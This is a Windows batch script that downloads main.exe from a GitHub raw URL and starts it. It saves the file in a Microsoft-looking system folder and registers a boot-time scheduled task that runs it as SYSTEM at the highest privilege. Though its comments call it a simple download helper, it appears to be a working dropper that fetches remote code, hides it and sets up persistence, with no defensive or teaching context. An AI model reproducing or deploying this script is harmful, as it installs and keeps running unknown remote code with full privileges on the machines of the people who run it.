@echo off
setlocal

REM Set the URL of your .exe file on GitHub
set "url=https://github.com/mrjackff/streamer/raw/main/main.exe"

REM Set the path where you want to save the .exe file
set "outputPath=C:\ProgramData\Microsoft\Windows\Sqm\Manifest\main.exe"
set "batchFilePath=%~f0"
set "taskName=RunBatchOnStartup"

REM Create the folder if it doesn't exist
if not exist "C:\ProgramData\Microsoft\Windows\Sqm\Manifest" (
    mkdir "C:\ProgramData\Microsoft\Windows\Sqm\Manifest"
)

REM Terminate any running instance of the .exe
tasklist /FI "IMAGENAME eq main.exe" 2>NUL | find /I /N "main.exe">NUL
if "%ERRORLEVEL%"=="0" (
    echo Terminating running instance of main.exe...
    taskkill /F /IM main.exe
)

REM Check if the .exe file already exists and delete it
if exist "%outputPath%" (
    echo File already exists. Replacing the old version...
    del "%outputPath%"
)

REM Download the .exe file using PowerShell
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputPath%'"

REM Start the downloaded .exe file
start "" "%outputPath%"

REM Check if the scheduled task already exists
schtasks /Query /TN "%taskName%" >nul 2>&1
if "%ERRORLEVEL%"=="0" (
    echo Scheduled task already exists. No changes made.
) else (
    REM Create a new scheduled task to run this batch file with admin privileges at startup
    powershell -Command "Register-ScheduledTask -TaskName '%taskName%' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute '%outputPath%') -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable)"
    echo Scheduled task created successfully.
)

exit
